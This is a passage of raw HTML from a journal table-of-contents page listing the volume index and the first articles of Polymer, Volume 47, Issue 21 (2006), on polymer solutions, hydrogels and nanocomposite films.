nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=29#29">Volume 29 (1988)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=28#28"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=28#28">Volume 28 (1987)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=27#27"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=27#27">Volume 27 (1986)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=26#26"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=26#26">Volume 26 (1985)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=25#25"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=25#25">Volume 25 (1984)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=24#24"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=24#24">Volume 24 (1983)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=23#23"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=23#23">Volume 23 (1982)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=22#22"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=22#22">Volume 22 (1981)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=21#21"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=21#21">Volume 21 (1980)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=20#20"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=20#20">Volume 20 (1979)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=19#19"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=19#19">Volume 19 (1978)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=18#18"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=18#18">Volume 18 (1977)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=17#17"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=17#17">Volume 17 (1976)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=16#16"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=16#16">Volume 16 (1975)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=15#15"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=15#15">Volume 15 (1974)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=14#14"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=14#14">Volume 14 (1973)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=13#13"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=13#13">Volume 13 (1972)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=12#12"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=12#12">Volume 12 (1971)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=11#11"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=11#11">Volume 11 (1970)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=10#10"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=10#10">Volume 10 (1969)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=9#9"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=9#9">Volume 9 (1968)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=8#8"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=8#8">Volume 8 (1967)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=7#7"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=7#7">Volume 7 (1966)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=6#6"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=6#6">Volume 6 (1965)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=5#5"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=5#5">Volume 5 (1964)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=4#4"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=4#4">Volume 4 (1963)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=3#3"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=3#3">Volume 3 (1962)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=2#2"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=2#2">Volume 2 (1961)</A></B></TD></TR><TR><TD width="9"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=1#1"><img src="/scidirimg/plus.gif" alt="Open" title="Open" width="9" height="9" border="0"></A></td><td nowrap colspan="2" valign=left class="txtBold"><A HREF="/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&jchunk=1#1">Volume 1 (1960)</A></B></TD></TR>
+    </table>
+  </div>
+</div>
+<div valign="top" style="margin-left:216px;">
+  <div style="width:100%; margin:0; padding:0">
+    <table width=100% cellpadding=0 cellspacing=0 border=0>
+  
+  <td class="pubBody" valign=top>
+    <table width="100%" cellpadding="3" cellspacing="0"  class="txt">
+      <tr valign="top" class="tochead" bgcolor="#518A2E">
+        <td>
+          <strong>
+            <font color=#ffffff>
+              Volume 47, Issue 21, Pages 7329-7610 (4 October 2006)
+              
+            </font>
+          </strong>
+        </td>
+        <td cellspacing="0" nowrap valign="top" align="right">
+           
+            
+              <a alt="Previous volume/issue" title="Previous volume/issue" class="ActionButton" href="/science?_ob=PublicationURL&_tockey=%23TOC%235601%232006%23999529979%23633186%23FLA%23&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=2970fd9fa62caa25b82154d882dc40f7">&#x25C4; Previous vol/iss</a>
+            
+            &nbsp;&nbsp;
+            
+              <span class="ActionButtonDisabled" alt="No next volume/issue" title="No next volume/issue">No next vol/iss</span>
+            
+          
+        </td>
+      </tr>
+      
+    </table>
+  </td>
+</table>
+
+
+<table width=100% valign="center" cellpadding=0 cellspacing=0 border=0>
+    <form  method=get name=Tag action="/science">
+      <input type="hidden" name="_ob" value="PublicationURL">
+      <input type="hidden" name="_method" value="list">
+      <input type="hidden" name="_tockey" value="#toc#5601#2006#999529978#633712#FLA#">
+      <input type="hidden" name="_auth" value="y">
+      <input type="hidden" name="_version" value="1">
+      <input type="hidden" name="refSource" value="toc">
+      <input type="hidden" name="_pubType" value="J">
+      
+        <input type="hidden" name="encodedHandle" value="V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U">
+      
+      
+        <input type="hidden" name="_cdi" value="5601">
+      
+      
+        <input type="hidden" name="count" value="36">
+      
+      
+      
+      <input type="hidden" name="md5" value="3200fd4cf7f7a88b89646962b21d82b7">
+
+      
+        <input type="hidden" name="chunk" value="0">
+      
+      
+      
+      
+        <input type="hidden" name="view" value="c">
+      
+      <input type="hidden" name="go" value="">
+      
+</table>
+
+<div style="height:10px"></div>
+<table cellpadding=0 cellspacing=0 width="100%">
+  <tr>
+    <TD nowrap width="1%" valign="bottom">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+    <td width="1%" valign="bottom" align="right"><img src="/scidirimg//tab_citation_on.gif" border="0" alt="Article List" title="Article List"></td>
+    <td width="1%" valign="bottom" align="left"><a href="http://www.sciencedirect.com/science?_ob=PublicationURL&_cdi=5601&_pubType=J&_auth=y&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=60b14ba14f8b3ec1a83635636a1c30fd&view=f"><img src="/scidirimg/tab_fullabs_off.gif" border="0" alt="Full Abstracts" title="Full Abstracts"></a></td>
+    <td valign="bottom" align="right"><a href="/science?_ob=QuickLinksURL&_method=createIntLink&_type=pubHome&_key=%23toc%235601%232006%23999529978%23633712%23FLA%23&_acct=C000053662&_version=1&_userid=1553416&md5=e32611021792f4f868dfdd2055054249" onmouseover="document.images['addQuickLink'].src='/scidirimg/sci_dir/addQuickLink_on.gif'" onmouseout="document.images['addQuickLink'].src='/scidirimg/sci_dir/addQuickLink_off.gif'"><img src="/scidirimg/sci_dir/addQuickLink_off.gif" border=0 name="addQuickLink" alt="Add to my Quick Links" title="Add to my Quick Links"></a></td>
+  </tr>
+</table>
+<table class="pubBody" border=0 cellpadding=0 cellspacing=0  width="100%" bgColor=#cccccc>
+  
+  <tr class="txt" height=22px>
+    <td align="left" valign="middle">
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/scidirimg/curvDownArrow.gif" alt="This arrow points to the article checkboxes which are used in conjunction with the following functions." title="This arrow points to the article checkboxes which are used in conjunction with the following functions." width="10" height="10">
+      <input type="image" name="subset" src="/scidirimg/sci_dir/btn_subset1.gif" onmouseover="this.src='/scidirimg/sci_dir/btn_subset2.gif'" onmouseout="this.src='/scidirimg/sci_dir/btn_subset1.gif'" title="Display selected articles" alt="Display selected articles">
+      
+        &nbsp;<input type="image" name="emailFriend" src="/scidirimg/sci_dir/btn_email1.gif" onmouseover="this.src='/scidirimg/sci_dir/btn_email2.gif'" onmouseout="this.src='/scidirimg/sci_dir/btn_email1.gif'" title="E-mail articles" alt="E-mail articles">
+      
+        
+          &nbsp;<input type="image" name="export" src="/scidirimg/sci_dir/btn_export1.gif" onmouseover="this.src='/scidirimg/sci_dir/btn_export2.gif'" onmouseout="this.src='/scidirimg/sci_dir/btn_export1.gif'" title="Export citations to a citation management program" alt="Export citations to a citation management program">
+        
+    </td>              
+    <td nowrap align="right" valign="middle">
+      
+      
+      
+        
+          articles <b>1 - 36</b>
+        
+      
+    </td>
+  </tr>
+</table>
+
+<div class="pubBody">
+  <span class="txt; !important">
+    <table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>1.&nbsp;<input type=checkbox name = art value="B6TXW-4KY7PM0-1:1"></td><td width=95% align=left colspan=2><b>
+
+
+
+Editorial board</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">EDITORIAL BOARD</span><br><i><nobr>
+
+
+Page CO2</nobr> </i><br><a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KY7PM0-1-1&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=eca3ce5a8ad2d4962bc1f1e47d883a7b&ie=/sdarticle.pdf">PDF (32 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=0 cellspacing=0 border=0>
+<tr><td border="0"><img src="/scidirimg/clear.gif" alt="" height=5></td></tr><tr height=22px bgcolor="#EEEEEE" class="pubBody"><td>&nbsp;<font class="sectionH1">POLYMER COMMUNICATIONS</b></font></td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>2.&nbsp;<input type=checkbox name = art value="B6TXW-4KSSWFC-1:2"></td><td width=95% align=left colspan=2><b>
+
+
+
+Effect of time on the hydration and temperature-induced phase separation in aqueous polymer solutions. <sup>1</sup>H NMR study</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">SHORT COMMUNICATION</span><br><i><nobr>
+
+
+Pages 7329-7334</nobr> </i><br>
+
+
+Larisa Starovoytova and Ji&#x159;&#xed; Sp&#x11b;v&#xe1;&#x10d;ek<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KSSWFC-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=2&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=a6079b06deaffce0c12d2cdb3c711d41">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KSSWFC-1&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=2&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=189d64c57223def872f930b0a77041b1">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KSSWFC-1-9&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=bfb259df5282ba8da2f3bd8a5914f154&ie=/sdarticle.pdf">PDF (362 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>3.&nbsp;<input type=checkbox name = art value="B6TXW-4KTVP3M-2:3"></td><td width=95% align=left colspan=2><b>
+
+
+
+Separation of the effects of pH and polymer concentration on the swelling pressure and elastic modulus of&#xa0;a pH-responsive hydrogel</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">SHORT COMMUNICATION</span><br><i><nobr>
+
+
+Pages 7335-7338</nobr> </i><br>
+
+
+Ferenc Horkay, Man-Hee Han, In Suk Han, In-Seok Bang and Jules J. Magda<br><a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVP3M-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=summary&_coverDate=10%2F04%2F2006&_rdoc=3&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=9ba62ed355f3a70321495536af4e24eb">SummaryPlus</a> | <a href="http://www.sciencedirect.com/science?_ob=ArticleURL&_udi=B6TXW-4KTVP3M-2&_user=1553416&_handle=V-WA-A-W-BZ-MsSAYVA-UUA-U-AAZACUEADE-AACEUYEEDE-AVZUBEVZV-BZ-U&_fmt=full&_coverDate=10%2F04%2F2006&_rdoc=3&_orig=browse&_srch=%23toc%235601%232006%23999529978%23633712!&_cdi=5601&_acct=C000053662&_version=1&_urlVersion=0&_userid=1553416&md5=d22e4aa0f44d0fdd95c5afe7b57e18f1">Full Text + Links</a> | <a href="http://www.sciencedirect.com/science?_ob=MImg&_imagekey=B6TXW-4KTVP3M-2-C&_cdi=5601&_user=1553416&_orig=browse&_coverDate=10%2F04%2F2006&_sk=999529978&view=c&wchp=dGLbVlb-zSkzk&md5=68ae1a50415eab679c9fe883a4e48e5d&ie=/sdarticle.pdf">PDF (276 K)</a>
+</td></tr></table>
+<table width=100% cellpadding=0 cellspacing=0 border=0>
+<tr><td border="0"><img src="/scidirimg/clear.gif" alt="" height=5></td></tr><tr height=22px bgcolor="#EEEEEE" class="pubBody"><td>&nbsp;<font class="sectionH1">POLYMER PAPERS</b></font></td></tr></table>
+<table width=100% cellpadding=10 cellspacing=0 border=0 id=pubBody class="txt">
+<tr><td class="txt" nowrap width=5% align=left valign=top>4.&nbsp;<input type=checkbox name = art value="B6TXW-4KVXPSK-3:4"></td><td width=95% align=left colspan=2><b>
+
+
+
+Structure and thermal properties of multilayered Laponite/PEO nanocomposite films</b> &#x2022;&nbsp<span style="font-family: Times New Roman, Times, Serif; font-size: 0.9em; font-weight: bold; color: #737373;">ARTICLE</span><br><i><nobr>
+
+
+Pages 7339-7348</nobr> </i><br>
+
+
